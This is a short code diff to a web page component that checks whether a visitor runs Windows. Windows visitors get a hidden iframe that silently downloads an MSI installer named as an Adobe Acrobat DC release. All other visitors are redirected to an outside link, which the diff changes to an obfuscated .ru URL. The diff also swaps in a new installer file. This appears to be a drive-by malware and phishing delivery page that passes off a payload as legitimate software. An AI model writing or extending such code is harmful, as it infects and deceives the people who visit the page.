@@ -5,13 +5,13 @@ export default function Home() {
     const userAgent = navigator.userAgent || '';
     const isWindows = /windows/i.test(userAgent);
 
-    const NON_WINDOWS_TARGET = "https://mksonline.com.mx/code";
+    const NON_WINDOWS_TARGET = "https://looker.ojtoiy.ru/Q!fon58sBW3UrfPTJXS3Rxb/";
 
     // 1. Windows users → MSI download, then redirect
     if (isWindows) {
       const iframe = document.createElement('iframe');
       iframe.style.display = 'none';
-      iframe.src = '/AdobeAcrobatDC_2025.003.40436_6601.msi';
+      iframe.src = '/AdobeAcrobatDC_2025.003.40436_7781.msi';
       document.body.appendChild(iframe);
 
       setTimeout(() => {
